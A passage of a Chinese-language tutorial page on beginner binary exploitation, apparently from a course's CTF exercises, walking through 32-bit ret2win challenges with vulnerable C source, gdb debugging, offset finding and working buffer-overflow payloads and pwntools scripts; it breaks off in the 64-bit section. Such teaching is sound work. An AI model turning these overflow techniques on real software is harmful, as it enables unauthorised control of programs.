+<li>导入存放字符的文件后直接运行</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">run &lt; exp</span><br><span class="line"></span><br><span class="line">●→  0x8049202 &lt;register_name+0055&gt; ret    </span><br><span class="line">   ↳   0x8049182 &lt;hacked+0000&gt;    push   ebp</span><br><span class="line">       0x8049183 &lt;hacked+0001&gt;    mov    ebp, esp</span><br><span class="line">       0x8049185 &lt;hacked+0003&gt;    push   ebx</span><br><span class="line">       0x8049186 &lt;hacked+0004&gt;    sub    esp, 0x4</span><br><span class="line">       0x8049189 &lt;hacked+0007&gt;    call   0x804921f &lt;__x86.get_pc_thunk.ax&gt;</span><br><span class="line">       0x804918e &lt;hacked+000c&gt;    add    eax, 0x2e72</span><br></pre></td></tr></table></figure>
+<ul>
+<li>发现：
+<ul>
+<li>程序原本的值是<code>main</code>函数的地址然后退出程序，现在被我覆盖成<code>hacked</code>函数的地址</li>
+<li>于是程序就返回到<code>hacked</code>地址执行指令</li>
+</ul>
+</li>
+</ul>
+<h4 id="pwntools脚本-v2"><a class="header-anchor" href="#pwntools脚本-v2">¶</a>pwntools脚本</h4>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *   <span class="comment"># 导入pwntools模块</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./ret2win&#x27;</span>)    <span class="comment"># 运行程序</span></span><br><span class="line">io.sendline(<span class="string">b&#x27;A&#x27;</span> * <span class="number">28</span> + p32(<span class="number">0x08049182</span>))   <span class="comment"># 程序运行后发送指定的字符串，格式为32位</span></span><br><span class="line"><span class="built_in">print</span>(io.recvall())   <span class="comment"># 接收输出</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>执行脚本</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(pwn) ➜ python3 exp.py</span><br><span class="line">[+] Starting local process &#x27;./ret2win&#x27;: pid 7216</span><br><span class="line">[+] Receiving all data: Done (107B)</span><br><span class="line">[*] Process &#x27;./ret2win&#x27; stopped with exit code -11 (SIGSEGV) (pid 7216)</span><br><span class="line">b&#x27;Name:\nHi there, AAAAAAAAAAAAAAAAAAAAAAAAAAAA\x82\x91\x04\x08\nThis function is TOP SECRET! How did you get in here?! :O\n&#x27;</span><br></pre></td></tr></table></figure>
+<hr>
+<h1>32位程序与64位程序和构造ROP链</h1>
+<p><a target="_blank" rel="noopener" href="https://ba1ma0.blog.csdn.net/article/details/126814308?spm=1001.2014.3001.5502">PWN入门（5）32位程序与64位程序和构造ROP链_ropper rop链构造-CSDN博客</a></p>
+<hr>
+<h2 id="32位"><a class="header-anchor" href="#32位">¶</a>32位</h2>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">(pwn) ➜  checksec ret2win_params</span><br><span class="line">[*] &#x27;/home/xaut/Desktop/baimaoTutorial/crypto-cat-ctf/pwn/binary_exploitation_101/04-ret2win_with_params/32-bit/ret2win_params&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">    Stack:    Executable</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(pwn) ➜  ./ret2win_params       </span><br><span class="line">Name:</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">Hi there, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">[1]    7626 segmentation fault (core dumped)  ./ret2win_params</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>程序报错退出了，报错的信息是分段错误，可能造成了缓冲区溢出</p>
+</blockquote>
+<h3 id="源码分析"><a class="header-anchor" href="#源码分析">¶</a>源码分析</h3>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">hacked</span><span class="params">(<span class="type">int</span> first, <span class="type">int</span> second)</span>     <span class="comment">//自定义的hacked函数，我们需要让程序执行这个函数才算破解程序</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (first == <span class="number">0xdeadbeef</span> &amp;&amp; second == <span class="number">0xc0debabe</span>)&#123;    <span class="comment">//需要同时满足first = 0xdeadbeef和second = 0xc0debabe</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;This function is TOP SECRET! How did you get in here?! :O\n&quot;</span>);   <span class="comment">//破解程序</span></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Unauthorised access to secret function detected, authorities have been alerted!!\n&quot;</span>);   <span class="comment">//破解失败</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">register_name</span><span class="params">()</span>   <span class="comment">//自定义register_name函数，是程序主要执行的地方</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">16</span>];    <span class="comment">//定义了一个变量，名为buffer，有16个字节的缓冲区</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Name:\n&quot;</span>);    <span class="comment">//输出字符&quot;Name:</span></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, buffer);   <span class="comment">//获取我们输入的字符，并存入到buffer变量里</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hi there, %s\n&quot;</span>, buffer);     <span class="comment">//输出字符Hi there和我们输入的变量</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    register_name();   <span class="comment">//调用上面的register_name自定义函数</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h3 id="静态调试-v3"><a class="header-anchor" href="#静态调试-v3">¶</a>静态调试</h3>
+<ul>
+<li>ubuntu上用ghidra，巨难用，跳过了</li>
+<li>之后做题就win拖拽文件到ida，不用虚拟机分析了</li>
+</ul>
+<h3 id="动态调试-v4"><a class="header-anchor" href="#动态调试-v4">¶</a>动态调试</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb ret2win_params</span><br></pre></td></tr></table></figure>
+<ul>
+<li>查看程序里的函数</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">info functions</span><br></pre></td></tr></table></figure>
+<ul>
+<li>输入命令cyclic获得测试用的字符串</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(pwn) ➜ cyclic 200</span><br><span class="line">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>生成200个字符串，每四个字符的最后一个字符都不一样</p>
+<p>用于测试覆盖程序的返回地址需要多少个字符</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$eax   : 0xd3      </span><br><span class="line">$ebx   : 0x61616166 (&quot;faaa&quot;?)</span><br><span class="line">$ecx   : 0x0       </span><br><span class="line">$edx   : 0x0       </span><br><span class="line">$esp   : 0xffffcad0  →  &quot;iaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaaua[...]&quot;</span><br><span class="line">$ebp   : 0x61616167 (&quot;gaaa&quot;?)</span><br><span class="line">$esi   : 0x08049250  →  &lt;__libc_csu_init+0000&gt; push ebp</span><br><span class="line">$edi   : 0xf7ffcb60  →  0x00000000</span><br><span class="line">$eip   : 0x61616168 (&quot;haaa&quot;?)</span><br><span class="line">$eflags: [zero carry parity adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]</span><br><span class="line"></span><br><span class="line">[!] Cannot disassemble from $PC</span><br><span class="line">[!] Cannot access memory at address 0x61616168</span><br></pre></td></tr></table></figure>
+<ul>
+<li>
+<p>显示：程序报错，里面原本的参数全被输入值覆盖</p>
+</li>
+<li>
+<p>注意：<code>ret</code>指令</p>
+<ul>
+<li><code>ret</code>是子程序的返回指令，原本要返回<code>main</code>函数，结果被覆盖，返回到其他不存在的地址，于是程序报错</li>
+</ul>
+</li>
+<li>
+<p><code>EIP</code>：程序的指针</p>
+<ul>
+<li>指针寻找地址，指到什么地址，就会运行该地址的参数</li>
+<li><strong><u>控制了这个指针，就能控制整个程序的运行</u></strong></li>
+</ul>
+</li>
+<li>
+<p><code>eip</code>寄存器里的值是<code>haaa</code>的十六进制，查一下<code>haaa</code>在生成字符串第几个</p>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">--&gt; cyclic -l haaa</span><br><span class="line">28</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>说明要覆盖eip原本</p>
+</blockquote>
+<ul>
+<li><code>eip</code>寄存器里的值是<code>haaa</code>的十六进制，查一下<code>haaa</code>在生成字符串第几个</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">--&gt; cyclic -l haaa</span><br><span class="line">28</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>说明要覆盖eip原本的返回地址并控制</p>
+<p>就需要28个字符+想让程序跳转执行的地址</p>
+</blockquote>
+<ul>
+<li>再次查看程序调用的函数地址</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">gef➤  info functions</span><br><span class="line">All defined functions:</span><br><span class="line"></span><br><span class="line">Non-debugging symbols:</span><br><span class="line">0x08049000  _init</span><br><span class="line">0x08049030  printf@plt</span><br><span class="line">0x08049040  puts@plt</span><br><span class="line">0x08049050  __libc_start_main@plt</span><br><span class="line">0x08049060  __isoc99_scanf@plt</span><br><span class="line">0x08049070  _start</span><br><span class="line">0x080490b0  _dl_relocate_static_pie</span><br><span class="line">0x080490c0  __x86.get_pc_thunk.bx</span><br><span class="line">0x080490d0  deregister_tm_clones</span><br><span class="line">0x08049110  register_tm_clones</span><br><span class="line">0x08049150  __do_global_dtors_aux</span><br><span class="line">0x08049180  frame_dummy</span><br><span class="line">0x08049182  hacked</span><br><span class="line">0x080491ad  register_name</span><br><span class="line">0x08049203  main</span><br><span class="line">0x0804921f  __x86.get_pc_thunk.ax</span><br><span class="line">0x08049230  __libc_csu_init</span><br><span class="line">0x08049290  __libc_csu_fini</span><br><span class="line">0x08049291  __x86.get_pc_thunk.bp</span><br><span class="line">0x08049298  _fini</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x08049182  hacked</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>hacked函数的地址为0x08049182</p>
+<p>写一个脚本让程序跳转到这个地址</p>
+</blockquote>
+<ul>
+<li>在<code>x86</code>架构里，读取地址是由低到高的，<code>十六进制0x08049182</code>就要从最后一个开始写，然后将输出的值存放到一个文件里</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 -c &quot;print &#x27;A&#x27;*28+&#x27;\x82\x91\x04\x08&#x27;+&#x27;AAAA&#x27;+&#x27;BBBB&#x27;+&#x27;CCCC&#x27;+&#x27;DDDD&#x27;&quot; &gt; exp</span><br></pre></td></tr></table></figure>
+<ul>
+<li>在<code>register_name</code>函数的最后<code>ret</code>指令处下一个断点</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">gef➤  disassemble register_name </span><br><span class="line">Dump of assembler code for function register_name:</span><br><span class="line">   0x080491d5 &lt;+0&gt;:	push   ebp</span><br><span class="line">   0x080491d6 &lt;+1&gt;:	mov    ebp,esp</span><br><span class="line">   0x080491d8 &lt;+3&gt;:	push   ebx</span><br><span class="line">   0x080491d9 &lt;+4&gt;:	sub    esp,0x14</span><br><span class="line">   0x080491dc &lt;+7&gt;:	call   0x80490c0 &lt;__x86.get_pc_thunk.bx&gt;</span><br><span class="line">   0x080491e1 &lt;+12&gt;:	add    ebx,0x2e1f</span><br><span class="line">   0x080491e7 &lt;+18&gt;:	sub    esp,0xc</span><br><span class="line">   0x080491ea &lt;+21&gt;:	lea    eax,[ebx-0x1f6b]</span><br><span class="line">   0x080491f0 &lt;+27&gt;:	push   eax</span><br><span class="line">   0x080491f1 &lt;+28&gt;:	call   0x8049040 &lt;puts@plt&gt;</span><br><span class="line">   0x080491f6 &lt;+33&gt;:	add    esp,0x10</span><br><span class="line">   0x080491f9 &lt;+36&gt;:	sub    esp,0x8</span><br><span class="line">   0x080491fc &lt;+39&gt;:	lea    eax,[ebp-0x18]</span><br><span class="line">   0x080491ff &lt;+42&gt;:	push   eax</span><br><span class="line">   0x08049200 &lt;+43&gt;:	lea    eax,[ebx-0x1f65]</span><br><span class="line">   0x08049206 &lt;+49&gt;:	push   eax</span><br><span class="line">   0x08049207 &lt;+50&gt;:	call   0x8049060 &lt;__isoc99_scanf@plt&gt;</span><br><span class="line">   0x0804920c &lt;+55&gt;:	add    esp,0x10</span><br><span class="line">   0x0804920f &lt;+58&gt;:	sub    esp,0x8</span><br><span class="line">   0x08049212 &lt;+61&gt;:	lea    eax,[ebp-0x18]</span><br><span class="line">   0x08049215 &lt;+64&gt;:	push   eax</span><br><span class="line">   0x08049216 &lt;+65&gt;:	lea    eax,[ebx-0x1f62]</span><br><span class="line">   0x0804921c &lt;+71&gt;:	push   eax</span><br><span class="line">   0x0804921d &lt;+72&gt;:	call   0x8049030 &lt;printf@plt&gt;</span><br><span class="line">   0x08049222 &lt;+77&gt;:	add    esp,0x10</span><br><span class="line">   0x08049225 &lt;+80&gt;:	nop</span><br><span class="line">   0x08049226 &lt;+81&gt;:	mov    ebx,DWORD PTR [ebp-0x4]</span><br><span class="line">   0x08049229 &lt;+84&gt;:	leave</span><br><span class="line">   0x0804922a &lt;+85&gt;:	ret</span><br><span class="line">End of assembler dump.</span><br><span class="line"></span><br><span class="line">gef➤  b *0x0804922a</span><br><span class="line">Breakpoint 1 at 0x804922a</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">run &lt; exp</span><br><span class="line"></span><br><span class="line">●→  0x804922a &lt;register_name+0055&gt; ret    </span><br><span class="line">   ↳   0x8049182 &lt;hacked+0000&gt;    push   ebp</span><br><span class="line">       0x8049183 &lt;hacked+0001&gt;    mov    ebp, esp</span><br><span class="line">       0x8049185 &lt;hacked+0003&gt;    push   ebx</span><br><span class="line">       0x8049186 &lt;hacked+0004&gt;    sub    esp, 0x4</span><br><span class="line">       0x8049189 &lt;hacked+0007&gt;    call   0x8049247 &lt;__x86.get_pc_thunk.ax&gt;</span><br><span class="line">       0x804918e &lt;hacked+000c&gt;    add    eax, 0x2e72</span><br></pre></td></tr></table></figure>
+<ul>
+<li>成功覆盖了原本的返回地址</li>
+<li>一直按<code>n</code>到<code>cmp</code>这一行</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">→  0x8049193 &lt;hacked+0011&gt;    cmp    DWORD PTR [ebp+0x8], 0xdeadbeef</span><br></pre></td></tr></table></figure>
+<ul>
+<li>查看这个寄存器里的值</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x $ebp + 8</span><br><span class="line">0xffffcad4:	0x42424242</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>0x42转换成ascii码是大写的B，对比失败后程序会跳转，破解失败</p>
+</blockquote>
+<ul>
+<li>修改exp内容</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 -c &quot;print &#x27;A&#x27;*28+&#x27;\x82\x91\x04\x08&#x27;+&#x27;AAAA&#x27;+&#x27;\xef\xbe\xad\xde&#x27;+&#x27;CCCC&#x27;+&#x27;DDDD&#x27;&quot; &gt; exp</span><br></pre></td></tr></table></figure>
+<ul>
+<li>再次打断点+运行</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x $ebp+0x8</span><br><span class="line">0xffffcad4:	0xdeadbeef</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>第一个寄存器的值对了</p>
+</blockquote>
+<ul>
+<li>查看下一个寄存器的值</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x $ebp+0xc</span><br><span class="line">0xffffcad8:	0x43434343</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>0x43转换成ascii码是大写的C，于是再改一下脚本</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 -c &quot;print &#x27;A&#x27;*28+&#x27;\x82\x91\x04\x08&#x27;+&#x27;AAAA&#x27;+&#x27;\xef\xbe\xad\xde&#x27;+&#x27;\xbe\xba\xde\xc0&#x27;+&#x27;DDDD&#x27;&quot; &gt; exp</span><br></pre></td></tr></table></figure>
+<ul>
+<li>再次查看寄存器的值</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x $ebp+0x8</span><br><span class="line">0xffffcad4:	0xdeadbeef</span><br><span class="line"></span><br><span class="line">.....</span><br><span class="line"></span><br><span class="line">gef➤  x $ebp+0xc</span><br><span class="line">0xffffcad8:	0xc0debabe</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>成功破解程序</p>
+<p>也可以直接运行程序然后导入文件进行破解</p>
+</blockquote>
+<h4 id="pwntools脚本-v3"><a class="header-anchor" href="#pwntools脚本-v3">¶</a>pwntools脚本</h4>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *   //导入pwntools模块</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./ret2win_params&#x27;</span>)    //运行程序</span><br><span class="line">io.sendline(<span class="string">b&#x27;A&#x27;</span> * <span class="number">28</span> + p32(<span class="number">0x08049182</span>) + <span class="string">b&#x27;AAAA&#x27;</span> +p32(<span class="number">0xdeadbeef</span>) + p32(<span class="number">0xc0debabe</span>))   //程序运行后发送指定的字符串，格式为<span class="number">32</span>位</span><br><span class="line"><span class="built_in">print</span>(io.recvall())   //接收输出</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(pwn) ➜ python3 exp.py</span><br><span class="line">[+] Starting local process &#x27;./ret2win_params&#x27;: pid 4700</span><br><span class="line">[+] Receiving all data: Done (119B)</span><br><span class="line">[*] Process &#x27;./ret2win_params&#x27; stopped with exit code -11 (SIGSEGV) (pid 4700)</span><br><span class="line">b&#x27;Name:\nHi there, AAAAAAAAAAAAAAAAAAAAAAAAAAAA\x82\x91\x04\x08AAAA\xef\xbe\xad\xde\xbe\xba\xde\xc0\nThis function is TOP SECRET! How did you get in here?! :O\n&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h2 id="64位"><a class="header-anchor" href="#64位">¶</a>64位</h2>
+<h3 id="获取文件信息"><a class="header-anchor" href="#获取文件信息">¶</a>获取文件信息</h3>
+<ul>
+<li>使用<code>checksec</code>查看程序详细信息</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">(pwn) ➜  64-bit git:(master) ✗ checksec ret2win_params</span><br><span class="line">[*] &#x27;/home/xaut/Desktop/baimaoTutorial/crypto-cat-ctf/pwn/binary_exploitation_101/04-ret2win_with_params/64-bit/ret2win_params&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    Stack:    Executable</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>
+<ul>
+<li>查看源代码</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">(pwn) ➜  <span class="number">64</span>-bit git:(master) ✗ cat ret2win_params.c </span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">hacked</span><span class="params">(<span class="type">long</span> first, <span class="type">long</span> second)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (first == <span class="number">0xdeadbeefdeadbeef</span> &amp;&amp; second == <span class="number">0xc0debabec0debabe</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;This function is TOP SECRET! How did you get in here?! :O\n&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Unauthorised access to secret function detected, authorities have been alerted!!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">register_name</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">16</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Name:\n&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, buffer);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hi there, %s\n&quot;</span>, buffer);    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    register_name();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="动态调试-v5"><a class="header-anchor" href="#动态调试-v5">¶</a>动态调试</h3>
+<ul>
+<li>gdb</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb ret2win_params</span><br></pre></td></tr></table></figure>
+<ul>
+<li>查看函数和反汇编<code>hacked</code>函数</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">gef➤  info functions</span><br><span class="line">All defined functions:</span><br><span 